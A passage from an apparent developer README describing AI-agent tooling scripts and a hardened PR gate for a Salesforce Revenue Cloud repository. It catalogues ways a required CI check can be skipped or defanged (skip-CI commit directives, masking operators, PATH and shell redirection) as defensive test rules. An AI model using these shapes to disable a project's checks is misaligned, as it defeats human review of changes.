# AI Agent Tooling Scripts

Scripts that support AI agent workflows by providing queryable interfaces to
project data and auto-generating reference documentation for AI skills.

These scripts are consumed by AI agents and the progressive-disclosure skill
system (`.cursor/skills/`). They are **not** part of the CCI deployment
pipeline and work with any AI coding agent.

---

## Scripts

### `query_erd.py`

CLI tool for querying the Revenue Cloud data model stored in
`docs/erds/erd-data.json` — Release 264 (Winter '27, API v68.0): 263
objects, 4,252 platform fields, 674 verified relationship edges (custom
fields excluded). The same JSON also exposes 1,148 reference fields in
total — see the "Reference Fields" line in `query_erd.py stats` for the
distinction. Avoids loading the 30K-line JSON file directly into AI
context.

⚠ **These figures are hardcoded prose with no generator behind them**, so a refresh
staled every copy at once — the 262→264 pass missed this file, and `stats` printed
264 figures while the line above still said 262. Four files carry them:

| File | Carries | Gated by `tests/test_erd_doc_counts.py` |
|---|---|---|
| `scripts/ai/README.md` (this file) | objects, fields, relationships, **and `1,148` reference fields** | the triple, yes; `1,148`, **no** |
| `docs/erds/README.md` | objects, fields, relationships | yes, prose **and** the Statistics bullets |
| `.cursor/skills/revenue-cloud-data-model/SKILL.md` | objects, fields, relationships | yes |
| `.cursor/skills/schema-validation/SKILL.md` | objects, fields, relationships | yes |

**`python tests/test_erd_doc_counts.py` now gates the triple in all four**, per site
rather than in aggregate, so a file that reworded or renamed its citation fails instead
of quietly leaving the audit. The wrapped citation above — `263` on one line, `objects,
4,252 platform fields…` on the next — is exactly the shape that escaped the first
version of that check, so keep the phrase within three lines. Still unchecked, and
still needing the manual sweep: the **`1,148` reference-field total**, which this file
and `.cursor/skills/schema-validation/SKILL.md` both carry (the table above used to call
this file its only copy — it is not, and a reader who trusted that would sweep one of the
two); the org-describe pair (254 objects / 3,913 fields); and the orphan/gap baselines.

`query_erd.py stats` is the generated source for all of them — reconcile against it,
not against another doc.

```bash
python scripts/ai/query_erd.py describe Product2         # fields, relationships, domain
python scripts/ai/query_erd.py relationships Product2     # all objects linked to/from Product2
python scripts/ai/query_erd.py domain Billing             # all objects in a domain
python scripts/ai/query_erd.py path Product2 Invoice      # relationship path between two objects
python scripts/ai/query_erd.py search "usage"             # fuzzy object/field search
python scripts/ai/query_erd.py stats                      # domain counts summary
```

**Data source:** `docs/erds/erd-data.json`
**Used by:** `.cursor/skills/revenue-cloud-data-model/SKILL.md`

### `generate_cci_reference.py`

Parses `cumulusci.yml` and generates three auto-updating reference files for the
CCI orchestration skill. Run after editing `cumulusci.yml` to keep AI agent
knowledge current.

```bash
python scripts/ai/generate_cci_reference.py                # regenerate all 3 files
python scripts/ai/generate_cci_reference.py --tasks-only    # just tasks-reference.md
python scripts/ai/generate_cci_reference.py --flows-only    # just flows-reference.md
python scripts/ai/generate_cci_reference.py --flags-only    # just feature-flags.md
python scripts/ai/generate_cci_reference.py --dry-run       # preview without writing
```

**Data source:** `cumulusci.yml`
**Outputs:**
- `.cursor/skills/cci-orchestration/tasks-reference.md` — all tasks by group
- `.cursor/skills/cci-orchestration/flows-reference.md` — all flows with step trees
- `.cursor/skills/cci-orchestration/feature-flags.md` — feature flags with usage index

**Used by:** `.cursor/skills/cci-orchestration/SKILL.md`

### `skill_manifest.py`

Resolves and validates the cross-repo skill manifest (`.claude/skill-manifest.yml`)
that links Foundations and PMOS. Uses PyYAML when available; otherwise it falls
back to a **minimal fallback** parser that supports baseline diagnostics only
(file presence, high-level manifest keys, repo discovery, and skill/grounding
path listing).

```bash
python scripts/ai/skill_manifest.py --check              # validate the manifest resolves
python scripts/ai/skill_manifest.py --list-skills foundations
```

`--check` resolves every path-shaped value in the Foundations section, with one documented
exemption: `.agents/artifacts/` is a separate **private** repo that the main one gitignores,
and the analysis-artifacts rule requires generated working documents to live there, so
tracked files legitimately cite paths inside it. Those references are audited normally when
the private tree is present — a typo on a workstation still fails — and **reported as
unaudited**, with the run passing, when it is absent. Without that split, `--check` failed on
every fresh clone and in CI while passing on the one workstation holding the clone, which is
what made it unfit to be a gating check. Covered by `tests/test_skill_manifest_audit.py`.

**Data source:** `.claude/skill-manifest.yml`
**Used by:** `.cursor/skills/pmos-integration/SKILL.md`, `pr_gate.py`

### `analyze_agent_tooling.py`

The single, tool-agnostic analyzer for the repository's AI-agent layer. It uses
positional subcommands (like `query_erd.py`) and imports only the Python
standard library at import time, so the gate runs in a fresh checkout before
CumulusCI/PyYAML are installed.

```bash
python scripts/ai/analyze_agent_tooling.py            # 'check' (default)
python scripts/ai/analyze_agent_tooling.py check       # baseline static checks (stdlib-only gate)
python scripts/ai/analyze_agent_tooling.py report      # write Markdown report + JSON scorecard
python scripts/ai/analyze_agent_tooling.py coverage    # write rule/skill coverage matrix
python scripts/ai/analyze_agent_tooling.py all         # check, then report, then coverage
```

Two check modes:

- **Baseline static checks** (`check`) — stdlib-only, no third-party
  dependencies. Verifies required agent entry points, `scripts/ai/*.py`
  syntax, the stdlib-only import invariant, dependency-guidance messages,
  manifest high-level keys, generated-reference markers, that every skill
  sub-file is registered by its parent `SKILL.md`, that the File-Specific Rules
  table is readable, and that this README documents the check modes. Exits
  non-zero on any failure, so it is safe to run as a CI/scheduled gate.

  The sub-file registration check guards a structural invariant: the parent
  `SKILL.md` is the *only* registry for sub-files, since `AGENTS.md` carries no
  second-level index. A sub-file its parent does not name is unreachable from
  every documented entry point, so adding one without linking it fails the gate.
  Register it as a code span or Markdown link; a mention in prose does not count.

  The rule-table check exists because `check` is the only leg that runs on a
  pull request. It asserts the *outcome* — rows actually parsed, and at least as
  many as there are `.cursor/rules/*.mdc` files — rather than merely that the
  heading is present. The failure this repo produces is "keep the heading as a
  pointer, move the table", which parses to zero rows and would otherwise render
  a coverage matrix claiming every rule is unlisted.
- **Full generated-reference checks** (`check --full-generated-reference-checks`)
  — additionally dry-runs `generate_cci_reference.py`, which requires
  PyYAML/CumulusCI. Skipped with clear guidance when PyYAML is absent.

PyYAML, when installed, enriches the `report` and `coverage` subcommands;
without it they degrade gracefully to a line-oriented fallback.

**Outputs:**
- `docs/analysis/tooling-optimization-report.md` — report (`report`)
- `.agents/context/tooling-scorecard.json` — machine-readable scorecard (`report`)
- `.agents/context/rule-skill-coverage.md` — rule/skill coverage matrix (`coverage`)

**Used by:** `.github/workflows/agent-tooling-optimization.yml`, the `.agents/`
tool-agnostic layer.

### `pr_review.py`

Automates the *mechanical* half of the "Responding to Automated PR Reviews"
protocol in `AGENTS.md`, so review rounds reliably end with **zero unresolved
threads**. Tool-agnostic — shells out to the authenticated `gh` CLI. Repo
defaults to the current checkout (`gh repo view`); override with
`--repo owner/name`.

```bash
python scripts/ai/pr_review.py status 213                              # list unresolved threads (paginated)
python scripts/ai/pr_review.py handle 213 --comment <id> --body "Fixed in <sha> …"   # reply + 👍 + resolve
python scripts/ai/pr_review.py handle 213 --comment <id> --body "…" --no-react        # refute a false positive (no 👍)
python scripts/ai/pr_review.py verify 213                              # confirm 0 unresolved (exit 1 if any remain)
```

The *judgment* half stays with the agent: verify each finding against the code,
classify it real / partial / false-positive, and sweep the whole class before
resolving (see `AGENTS.md` and `.cursor/skills/audit-review/SKILL.md`).

**Used by:** `AGENTS.md` §"Responding to Automated PR Reviews", the `/pr-review`
Claude command (`.claude/commands/pr-review.md`),
`.cursor/skills/audit-review/SKILL.md`

### `check_branch_scope.py`

Fails a branch that carries commits it does not own — the signature of a branch
cut from a *composed* integration branch, which inherits other in-flight fixes
**in their pre-review state** and can therefore revert landed review fixes when
it merges.

```bash
python scripts/ai/check_branch_scope.py --pr 370          # both signals below
python scripts/ai/check_branch_scope.py --base origin/264 # HEAD vs an explicit base
```

Two signals, because the inherited work may or may not have merged yet and each
signal is blind to one of those cases:

1. **Already upstream** — `git cherry`, patch-id equivalence (`-` = the content is
   in the base already). This is the `#264-56` signal, and it only fires once the
   other PRs have merged.
2. **Shares history with another open PR beyond the base** — if this head and
   another open PR's head join at a commit the base does not have, that shared part
   has merged nowhere yet, so signal 1 cannot see it. Needs `--pr`. Found the hard
   way: the branch for this check's own companion fix was cut from this check's
   branch, and signal 1 said clean.

   Not plain ancestry, which was the first version: that only catches a parent that
   has not *moved* since the branch was cut, and a parent which advances afterwards
   is invisible to both signals at once.

   A shared join is **symmetric**, so it cannot say by itself who inherited from
   whom. Four exclusions keep the signal off the wrong branch, and every one was a
   false positive first:

   | skipped | why |
   |---------|-----|
   | head already in the base | the release integration PR (`264` → `main`) has the base branch *as* its head, which otherwise flags every branch up to date with base — making a stale branch read cleaner than a current one |
   | a fork's head | not in this checkout; the `<remote>/<branch>` fallback would resolve a fork PR on a branch named `264` to *our* `264` |
   | a PR that targets **this** branch | that is a declared child stack. History cannot tell it from a parent: a child cut from our `B` while we advance to `C` is the same graph. Without it, a parent PR failed its own gate as soon as it took a review fix |
   | a descendant of this head | the unmoved form of the same case |

   What is left — diverged, not a declared child — is reported but **not attributed**:
   the output says direction is not derivable and prescribes no rebuild, because
   telling a branch to rebuild over commits that may be its own is how a gate gets
   bypassed.

A clean result means "neither known contamination shape is present", not "this
branch owns every commit" — `git cherry`'s `+` only says no patch-equivalent commit
was found upstream. The residual gap: an inherited commit whose upstream
counterpart was **amended or squash-combined** before merging has different
content (so signal 1 finds no match) and a closed PR (so signal 2 does not list
it). It did not arise in `#264-56` — all five inherited commits were
patch-identical to their merged versions — but the diff review still has to happen.

Two weaker checks were tried and rejected — `merge-base --is-ancestor` against the
*base* cannot separate an inherited commit from a legitimate new one, and
subject-matching breaks on a reworded subject. Exit 0 clean, 1 findings, 2
usage/tool error (so a missing `git`/`gh` never reads as a dirty branch).

Note that a parent branch that *truly* merged (a merge commit, not squash or
rebase) is correctly not a finding: its commits are literal ancestors of the base,
so they are not in this branch's diff and there is nothing to strip.

The pre-comparison fetch **fails closed**: if it cannot reach the remote, the check
exits 2 rather than comparing the stale ref it just failed to refresh. That matters
because the stale-base case reports *clean* — so a swallowed fetch error would
reinstate the exact false negative the fetch exists to prevent, and it would do so
precisely when something is wrong (offline, dead credential). Skipping the fetch is
still available, but only by asking for it with `--no-fetch`.

Verified by `tests/test_branch_scope.py` (74 checks, throwaway repos, no network),
which reproduces the `#264-56` shape (5 inherited + 3 own → "5 of 8"), the rebase
that fixes it, a reworded inherited commit, a true-merged parent, a stale base
(which reports clean — so the fetch is load-bearing), a failing fetch (exit 2), a
slash-bearing local branch such as `release/262` that must not be fetched as a
remote, and the exit-code contract. Signal 2 is driven end to end through `--pr`
against a stubbed `gh`; testing only its ancestor helper let three mutations that
delete the signal outright pass. Emptying the PR loop, inverting the ancestor test
at either place, dropping `stacked` from the failure condition, disabling the
containment or fork guard, and either removing the fetch or letting it fail
silently each fail the suite.

**Used by:** `AGENTS.md` §"Merges and unintended diffs",
`.cursor/skills/audit-review/SKILL.md` §"Step −1"

### `pr_gate.py`

Runs the mechanical checks a change actually needs, and reports the status of **every**
check — including the ones it skipped, and why. One command instead of remembering which
of eighteen validators a given diff should have run.

```bash
python scripts/ai/pr_gate.py --base origin/264   # select from the diff vs a base ref
python scripts/ai/pr_gate.py --all               # run everything
python scripts/ai/pr_gate.py --list              # the matrix: check, gating, deps, triggers
python scripts/ai/pr_gate.py --requirements --base origin/264   # pip deps the selection needs
```

Selection lives here rather than in a workflow's `paths:` filter because the two ways of not
running fail in opposite directions. A workflow skipped by path filtering reports nothing, so a
check required on it stays **Pending** and blocks the merge indefinitely; a job or step skipped
by an `if:` condition reports **success**, so it reads like a pass. (This paragraph said the
first behaved like the second until round 12 of review; the conclusion held, the reason did
not.) The same care drives four statuses that are easy to conflate:

| status | meaning | fails? |
|--------|---------|--------|
| `SKIPPED` | not selected — nothing it covers changed | no, and it says so on its own line |
| `MISSING-DEP` | selected, but a package or the interpreter floor is absent | **yes** — otherwise a broken install silently turns a gate green |
| `ADVISORY` | runs and reports, never fails | no, and the reason is printed inline |
| `ADVISORY-DEP` | advisory, and its dependency is absent too | no — an advisory check cannot fail for a missing dep either |

No check is currently advisory. `validate_sfdmu_v5_datasets.py` (`sfdmu_datasets`) was the one
exception, exiting non-zero on a clean tree because of two false-positive Criticals plus High
findings under the unwired `mfg/en-US/mfg-multicurrency` plan (counted below). Pack 123 fixed the
Criticals — a
`Readonly` object is queried from the target org and owes no source CSV, and a per-pass object's CSV
can live at `objectset_source/object-set-N/<Object>.csv`, an *alternative* to the root CSV **for that
pass only** — and only when the plan's top-level `useSeparatedCSVFiles` is `true`; pass 1 always reads
the root regardless of the flag. Neither qualifier met, the root CSV is still owed. Both gates stay
conditional on their own reason, so an `Upsert` object with no CSV anywhere still fails;
`tests/test_sfdmu_csv_expectation.py` pins both directions in 147 cases. Two mechanisms make that
pinning necessary rather than decorative. `_parse_object_configs` keeps only the *first* declaration,
so reading the operation from the merged config would let a `Readonly` first pass silence a writable
later pass. And the exemption has to be keyed on the **pass**, not the object: `BillingPolicy` in
`qb-billing` is `Upsert` in pass 1 and `Update` in pass 3 with an override only for pass 3, so a
name-keyed exemption stops checking the root CSV that pass 1 reads — 16 objects across 7 scanned plans
have that shape (11 in the 5 that `cumulusci.yml` wires), against exactly one of the 17 objects
carrying an override (`procedure-plans/ProcedurePlanOption`) declared in a single pass. Repo-wide 399
objects are single-pass, so the comparison only holds among the objects a name-keyed gate would exempt.
**High** findings were left standing after that fix — zero-byte `Upsert` CSVs under
`datasets/sfdmu/mfg/en-US/mfg-multicurrency/`, which loaded nothing. Those were real, but dormant, and
the reason was broader than that one plan: `grep -ic mfg cumulusci.yml` returned **0**, so all twelve
`mfg` plans were unwired — this one was not singled out. Pack 110 deleted it rather than adding
header rows, following `q3-multicurrency`, which was deleted in `dab545ab` carrying zero-byte
`CostBook`/`CostBookEntry` CSVs of its own — the identical finding, disposed of by removing the plan.
*Either* severity bucket had failed the validator, which is why landing 123 alone did not turn this
check green — it took 110 too (pack 123, pack 110 — "pack N" throughout this file means an entry in
the durable todo tracker under `.agents/artifacts/todos/`, which is gitignored, so the reference
resolves for whoever holds that tree and not from a fresh clone; likewise "round N" means a round of
review on the pull request that added this workflow). With both landed, the live tree is 0 Critical,
0 High, and `sfdmu_datasets` now gates like every other check. The mechanism itself remains available:
a check that always fails gets ignored, and
an ignored check is worse than an absent one, so any future case gets labelled with its reason instead
of being dropped or allowed to fail every matching PR.

Three details worth knowing before editing the matrix.

`unlisted_suites()` fails the gate when a suite under `tests/` is not claimed by any check —
a new suite that nothing runs is not a passing suite. It walks the tree recursively and
counts `.sh` as well as `.py`, because the first version listed only the top directory and
so reported "none unclaimed" while 30 nested suites and 2 shell scripts went unrun. A suite
that genuinely should not run in CI goes in `EXCLUDED_SUITES` with its reason, so the
exclusion is a written decision rather than an oversight. A directory claim covers only the
`.py` files beneath it, since the checks that claim directories invoke pytest: a shell suite
added under `tests/build_harness/` stays unlisted until someone runs it or records why not.

`tests/test_docgen_helpers.py` is the one pytest-style suite **directly under `tests/`** — the
two harness directories hold roughly 30 more — and it is worse
than a suite that fails outside pytest: run as `python tests/test_docgen_helpers.py` on an
interpreter where pytest is importable, it exits **0 having run nothing** — every test is a method
inside one of its eleven `class Test…` bodies, and there is no `__main__` to collect them. (Where
pytest is *not* importable it exits 1 on the `import pytest` at the top, which is the honest
failure; the silent-pass case is the one to know about. An earlier version of this paragraph said
the file was "all `def test_*`", which is exactly backwards — it has none at module level.) That is
why it is invoked through pytest rather than the repo's usual `python tests/<name>.py`; the
convention gap itself is a separate todo.

A check has to be selected by **every file it reads**, not only by the code it tests — the
absence hole one level up from a missing check. Five shipped at once: a suite asserting that
this README cites its current size while a README edit selected nothing; the CumulusCI pin
compared against `prepare-rlm-org.yml` with that workflow untriggered; the "do not edit"
generated references editable without the drift check running; the manifest audit resolving
paths repo-wide from a three-prefix trigger list; and two suites reading a skill's stated count
and a `docs/references/` example outside their triggers. Each was invisible the same way — the
check ran and passed, just not when the input it asserts against changed. `tests/test_pr_gate.py`
now enumerates the paths each suite names and fails if any of them cannot select that suite;
the two script-backed checks get exact gates instead, reading `_PATH_ROOTS`/`_ROOT_FILES` out
of `skill_manifest.py` and the required-file lists out of `analyze_agent_tooling.py`, so a
hand-kept copy cannot drift. Writing that enumeration immediately found three more: `CLAUDE.md`
is a file `analyze_agent_tooling.py` asserts the presence of, the `qb-dro` dataset is read by
`test_fulfillment_scope_tolerance.py` to verify a banner's count, and the gate's own suite reads
two other `scripts/ai/` modules to prove the matrix still selects on their constants.

That enumeration then had to be widened twice, because a guarantee is only as wide as the
shapes it recognises and a shape it cannot see fails nothing. It skipped **directory**
arguments, so the ~30 suites under `tests/build_harness/` and `tests/txn_data_harness/` — named
only by their parent directory — sat outside it entirely; and it required a slash to recognise a
path, so a root-level file named as a single segment (`repo_root / "tui-cci"`) was invisible.
Together those hid a real gap: `tests/build_harness/test_tui_launcher.py` copies and executes
the root `tui-cci` launcher, which **no** matrix entry selected, so a launcher regression could
merge with its own existing test unrun. A single rooted segment now counts when it names a root
*file* — `os.path.join(REPO, "scripts")` is a directory on its way to a longer path, not a read
— and only the outermost node of a `REPO / "a" / "b"` chain counts, since `ast.walk` sees every
prefix in it and each one is a validly rooted path.

The rule runs the other way too: a check must be selected by the script it **executes**. The
enumeration above walks each check's test-suite sources, so the two checks whose command is a
validator rather than a suite contributed nothing to it — and both were editable without the
check that runs them running, leaving only `agent_tooling`'s syntax scan between a semantic
regression in a validator and a merge. Derived from each check's own `cmd` rather than a
hand-kept list, with a positive control: on a correct matrix, blinding that rule yields the same
empty answer, so the assertion alone cannot tell a held property from an unexercised one.

The meta-check that carries all of this is selected by any `tests/` change, not just by edits to
itself. Otherwise a PR could add a repo-file read to some other suite, omit the trigger, and the
one check that would have caught the omission never ran. That widening makes the suite selectable
by its own fixtures, so `main_with()` refuses a fixture whose paths would select the gate — once,
centrally, rather than trusting every future call site. Worth knowing if you remove that guard:
the failure mode is not a failing check but a **hang**, each level re-running the gate inside the
level above it, bounded only by the nested per-check timeouts.

A dependency is probed by really importing it, in a child process, not by `find_spec`. The
distinction is not academic: CumulusCI 4.8.1 imports `fs`, which imports `pkg_resources`,
which a Python 3.12+ venv does not have until setuptools is installed — so `find_spec` calls
that install fine, and the breakage surfaces later as unrelated-looking suite failures. The
`cumulusci` entry therefore probes `cumulusci.core.tasks`, the depth a task actually needs,
and `--requirements` emits `setuptools>=75.4,<77` ahead of the CumulusCI pin whenever a
selected check needs it — the same pin `prepare-rlm-org.yml` installs. Emitting it is the
point: installing exactly what `--requirements` prints has to *work*, or the caller gets
`MISSING-DEP` for a dependency it just installed and has to rediscover why.

Selection diffs `base...HEAD` — three dots, from the merge base — so commits that landed on
the base after the branch diverged do not enlarge it, and uncommitted work counts too, so
running it before a commit is honest. That last part needs `--untracked-files=all`: plain
`git status --porcelain` collapses a wholly new directory to a single `?? docs/` entry — the
topmost new directory, not even the leaf — so every file in a new subtree was invisible to
suffix and deeper-prefix triggers while the report still said uncommitted work was covered.
Exit 0 all selected gating checks passed, 1 at least
one failed, 2 usage or tool error (matching `check_branch_scope.py`, so a tool error is
never read as a verdict). That contract is only worth having if it holds everywhere, and it took
three rounds to make it: the CCI-reference check returned 1 when its `git status` failed,
presenting an unusable git as a failed check while the two calls in `changed_files()` already
died; then a command that could not be spawned at all raised `OSError` out of `run()` and escaped
as a traceback, which the interpreter turns into exit 1; then the *same* spawn gap turned out to
remain at every call site that bypasses `run()` — `changed_files()` caught only
`FileNotFoundError`, so a git present on `PATH` but not executable (`PermissionError`, equally an
`OSError`) still escaped, and the drift check's status call had no spawn guard at all.

Adding a guard per call site is what failed twice, so git now has one door: **`git(args,
purpose)`** dies on a spawn failure and on a non-zero exit, and a test refuses a raw
`subprocess.run` in any function other than the three that own a guard. A **timeout** deliberately
stays a check failure: a check that hangs is a property of the change under test, unlike an
interpreter that will not start.

What it deliberately does not cover: `check_branch_scope.py --pr <n>` itself. The matrix runs
that checker's *tests*, which is a path-selectable thing, but the per-PR branch verification
takes a PR number and talks to GitHub, so it belongs in the workflow (which has
`github.event.pull_request.number`) rather than in a local, hermetic gate.

That workflow is `.github/workflows/pr-checks.yml`, and it runs on every pull request: it asks
`--requirements` what the selection needs, installs exactly that, runs the gate, then runs the
per-PR branch scope. `Mechanical checks` **is** a required status check, on `main`, `264` and
`release/*`, pinned to the GitHub Actions app so no other actor can report a same-named check to
satisfy it. That was a separate act from writing the workflow — repository settings, not a file here —
and until it happened every guard below was advice.

Four platform behaviours sit outside every guard in that file and are worth knowing before
trusting a green:

* **`[skip ci]` skips the whole thing.** A head commit whose message contains `[skip ci]`,
  `[ci skip]`, `[no ci]`, `[skip actions]`, `[actions skip]`, or a `skip-checks: true` trailer
  produces no run at
  all. That *was* a complete, self-service bypass needing no permissions. Now that the check is
  required the identical case leaves it **Pending**, which blocks — same mechanism, opposite sign,
  and the clearest illustration of why requiring the check was the load-bearing step rather than a
  formality. **Demonstrated the hard way:** the commit that made the check required had one of those
  strings in its message *because it was describing this bullet*, and GitHub skipped every workflow
  on it — zero runs, no check run on the head SHA, and the PR correctly unmergeable with no merge
  conflict. So the trap is not only a bypass an author might reach for deliberately: **a commit
  message that quotes a skip directive triggers it**, and the commits most likely to quote one are
  the commits that edit this file. Refer to the directives by name in commit messages, never in
  their bracketed form. File contents are unaffected — the scan reads commit messages only, which
  is why the bracketed list above is safe to keep here.
* **The two actions may be pinned by tag, and are.** `actions/checkout@v6` and
  `actions/setup-python@v6` both move with every 6.x release — the suite accepts either a release tag
  or a full 40-hex commit SHA, so switching to a SHA is a one-line edit that needs no rule change
  (the first version of that rule compared the whole `uses:` string and refused the *stronger* pin), and they execute in the workspace
  immediately before the gate — so a repointed tag could patch the scripts or shim `python`,
  which is precisely the class the shell rules spend two hundred checks refusing. It is accepted
  rather than solved: first-party actions, a public repo, `contents: read` plus
  `pull-requests: read`, and no repository secrets in scope — the job's only credential is the
  read-scoped `GITHUB_TOKEN`, which is not nothing but cannot write — so the exposure is integrity
  under an `actions`-org compromise. Also note `setup-python` legitimately prepends to `PATH`, which is
  the same class the `$GITHUB_PATH` rule forbids in a `run:` line — permitted only because it
  arrives through `uses:`.
* **`merge_group` runs are not equivalent to a PR run.** A merge-queue run has no base ref, so it
  selects `--all` and skips the branch-scope step: FOREIGN/STACKED do not run there. It is wired
  anyway because a required check that never runs in a merge queue deadlocks the queue, and the
  triggers are now whitelisted (`pull_request` and `merge_group`, nothing else) by a check.
* **`workflow_dispatch` was removed, and the reason generalises.** A manual run publishes a check
  with the *same name* on the same SHA, and GitHub shows the latest conclusion for a name — so a
  dispatch on a PR's head SHA does not sit beside the PR's verdict, it *replaces* it. Anyone with
  write access could publish that check with no commit and no review. It could not turn a *failing*
  gate green — a dispatch selects `--all`, a superset of any `--base` selection, so whatever failed
  fails again — but it skips the branch-scope step, which is gated on `pull_request`, so a FOREIGN or
  STACKED finding or a persistent tool error there is cleared by one button. Convenience for
  re-running a check does not buy that. The same argument rules out `push` and any other event that can carry a
  PR head SHA, which is why the trigger list is a whitelist rather than a blacklist.

The suite asserts the workflow cannot be quietly defanged, because every way of disabling it
leaves a green PR behind — the same absence the gate exists to close, one level up. Load-bearing
rather than stylistic: no `paths:` filter (a path-skipped workflow leaves a required check
Pending, blocking every PR that misses the paths; it is an `if:` skip that reports success),
`fetch-depth: 0` (past a shallow boundary `git diff base...HEAD` fails outright, and the gate
turns a failed git into exit 2 — a tool error, not a pass; the pin buys a *usable* diff rather
than protection from a silent empty one), an *executed* invocation that is not `--requirements` (that one resolves
dependencies; its exit code is not a verdict), `--pr` on the branch-scope call (without it the
checker silently loses its STACKED signal), a Python floor **derived from the matrix's highest
`min_python`** rather than written down (a check below its floor reports `MISSING-DEP`, which
fails the gate — so a runner that satisfied a hardcoded 3.10 would have failed the job it was
meant to protect), and no `${{ }}` anywhere the shell can see it. Dependencies are never
restated: an install line may name `${reqs}` or upgrade pip and nothing else, a rule that needs
no package list and so cannot drift from `PINS`/`CO_REQUIRES`/`deps`.

Two properties of *how* those assertions are written, both learned by having them fail:
every one reads the **comment-stripped** body, because a rule about what the job does must not
be satisfiable by prose about what it does; and each is paired with a positive control feeding
it the violation, because on a correct file a working rule and a blind one return the same
answer. This file is densely commented precisely because each setting matters, which is what
made the first version of three separate guards vacuous.

A full `--all` run is 18 checks in about 17 seconds, of which the branch-scope *suite*
(`tests/test_branch_scope.py`) is 8 —
so the gate costs roughly one branch-scope run more than nothing, and a typical docs-only
selection is a couple of seconds. That timing is measured on a machine where two of the eighteen
(`docgen_suite`, `harness_suites`) are blocked on optional dependencies and so contribute nothing, which
is worth naming rather than leaving the reader to assume all eighteen ran: with those installed the
number is higher.

Verified by `tests/test_pr_gate.py` (689 checks, throwaway repos, no network — hermetic for all but
one, the fixture that runs the real gate and so selects the real `skill_manifest` check, which
resolves sibling repos by absolute path and therefore fails in a detached worktree), which
drives the verdict rather than the helpers. Every mutation below is confirmed to fail the
suite: a prefix trigger loosened to a substring match, a two-dot diff, a runtime failure
reclassified as advisory, a gating failure that still exits 0, a missing dependency counted
as a skip or relabelled `SKIPPED`, the unclaimed-suite check blinded or its new suite left
unclaimed, the silent-failure section dropped, an advisory flipped to gating, `run_sequence`
short-circuiting, a drifting CumulusCI pin, an emptied trigger list, a usage error exiting 1,
a dropped Python floor, a dropped requirements pin, renames collapsed to the destination
only, the per-check timeout removed, advisory output truncated from the tail again, the
dependency probe reverted to `find_spec` or to a shallow `cumulusci` import, either
`git status` return code left unchecked or the drift one downgraded from a tool error to a
verdict, an unspawnable command left to escape as a traceback, `git()` narrowed back to
`FileNotFoundError` or no longer dying on a non-zero exit, a raw `subprocess.run` reintroduced
outside the three guarded functions, a timeout reclassified as a tool error — which matters because a failed `git status` returns
empty stdout, indistinguishable from a clean tree, so it would drop uncommitted paths from
the selection and, in the CCI-reference check, report "no drift" and pass — `--untracked-files=all`
dropped, the setuptools co-requirement dropped or emitted after the package that needs it,
a directory claim swallowing shell suites again, `pyproject.toml` removed from either
pytest-driven check's triggers, each of the eighteen trigger lists narrowed back off an input its
check reads or a script it runs, and each of the four read-enumeration shapes stopped being recognised (directory
arguments unexpanded, rooted single segments unseen, chain prefixes unfiltered, a root
directory counted as a read). The rest of the corpus — the figure given below, counted
once — breaks the CI workflow instead of the driver, all killed, in eleven families. The families are
what the rules cover; the parenthesised shapes are the
ones actually mutated, which is narrower — an earlier version of this list named `paths-ignore:`,
`|| :` and `|| exit 0` as though they had been probed when only the rules mentioned them. Both of those
handler shapes *are* probed now, along with `|| sleep 0` and `|| printf ''`, which is how the
masking blacklist was found: `sleep` sat in the harmless-command whitelist while the masking
blacklist did not name it, so the two disagreed and a real verdict was discarded.
The job never runs (a `paths:` filter quoted and unquoted, `branches:`, `types:` narrowed,
`pull_request:` deleted from `on:`, an `if:` on the job — before *and* after the `steps:` list — or
on either step, quoted or bare, `if: false`, `if: vars.X`, a decoy job placed above the real one);
dependencies drift (a pin restated in place of `--requirements` in any of four
spellings, the `--requirements` call removed); the diff is empty (the clone made shallow, or
`SEL` neutralised to `--base HEAD` — in either local assignment *or* in the `$GITHUB_ENV` export,
which is the line the separate gate step actually reads, and the one a rule that looked only for
`SEL=…` assignments never saw); the environment is wrong (the Python floor dropped below the matrix);
untrusted input reaches the shell (`${{ }}` moved into a `run:` step in each of its three scalar
styles); either command is present but not run (echoed, inside a heredoc, behind a shell flag,
wrapped in `if …; then`, replaced by an inline trailing comment, or replaced by `--list`/`--help`,
whose exit codes are not verdicts); the command runs but its verdict is discarded (`|| true`,
`|| exit 0`, `|| echo`, `|| /bin/true`, `&`, `$( )`, `continue-on-error:`, `set -e`
dropped, `set +e` without a check, a trailing `echo` or `exit 0`, or `code=$?` replaced by
`code=0`, an `echo` that then `exit 0`s or shadows `python` as a function); the command is present,
unmasked, and never reached (`true || python …`, `false && python …` — for either the gate or the
checker, and for either `set --` line, since a skipped argument list supplies neither `--pr` nor
`--no-fetch` while leaving both flags visible on the line; or the shell simply ends first, either on
the same line as the command — `exit 0; python …` — or on an earlier line of the step, which no
per-line rule can see); the command runs and is not the program (`python` redefined as a shell
function, or `PATH` re-pointed by a bare assignment, on the invocation line or above it, in the step
or appended to `$GITHUB_PATH` for a later one; the script truncated by a redirection or restored to an
older revision by `git checkout`; the script passed as *data* to `python -c`. `alias`, `hash -p` and
`export PATH=` are refused too, but by *controls inside the suite* rather than by a corpus mutation —
a distinction worth keeping, since a control asserts a predicate's answer and a mutation asserts the
whole file's verdict); the checker is defanged
(backgrounded with `&`, so `$?` is the fork's status and the
real script still runs and still reports success; `--pr` stripped, or left only in an `echo` beside a real
argument list; the retry loop widened to swallow a verdict or stripped of its condition; the step
moved off `pull_request`; the retry loop replaced by a one-shot that captures `$?` and never
exits with it; `--no-fetch` dropped, which reinstates an unauthenticated `git fetch` that passes on
a public repo and fails on a private one; the fork branch's condition made always-true, which sends
every PR down the path that has no `--pr` and so loses STACKED while the flag survives, unreachable,
in the `else`); and the step is present but reinterpreted (`shell: "cat {0}"`, which makes the runner
print the script instead of executing it, at step level or as a job-wide `defaults.run.shell`; a step
`env:` re-pointing `SEL`; the base ref rewritten to `HEAD` upstream of a correctly-pinned `SEL`).
Plus the two that remove the guard itself: the workflow dropped from
this check's own triggers, and the file deleted.

*Correct* edits are confirmed to be accepted too, because a rule that fires on a legitimate change
is a rule someone deletes. Six are asserted by controls inside the suite — a re-raising handler
(`|| { echo "::error::…"; exit 1; }`), a trailing `echo "::notice::"`, a progress `echo` before the
call, `--no-fetch` moved onto the invocation instead of the argument list, a `types:` filter that is a
*superset* of the default three, and a `git rev-parse` written with any of the four redirection
spellings the rule permits. Two of those six had no control until a review went looking: the superset
`types:` passed only because the live workflow happens to carry one, and the `::notice::` only because
the annotation alternation names it — "separately confirmed" was, for those two, a claim about a
coincidence. Forty-seven more are applied to the real workflow by a second harness (below), which is a
